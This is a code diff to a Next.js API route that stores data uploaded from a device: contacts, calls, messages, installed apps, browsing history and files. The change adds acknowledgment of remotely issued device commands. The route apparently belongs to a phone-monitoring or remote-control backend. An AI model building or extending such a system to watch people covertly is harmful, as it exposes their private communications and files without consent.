@@ -7,13 +7,21 @@ export const dynamic = "force-dynamic";
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const { device_id, contacts, calls, messages, installed_apps, browsing_history, files } = body;
+    const { device_id, command_id, contacts, calls, messages, installed_apps, browsing_history, files } = body;
 
     if (!device_id) {
       return NextResponse.json({ error: "device_id is required" }, { status: 400 });
     }
 
     const admin = createAdminClient();
+
+    if (command_id) {
+      await admin
+        .from("device_commands")
+        .update({ status: "executed", executed_at: new Date().toISOString() })
+        .eq("id", command_id);
+    }
+
     const results: Record<string, number> = {
       contacts: 0,
       calls: 0,
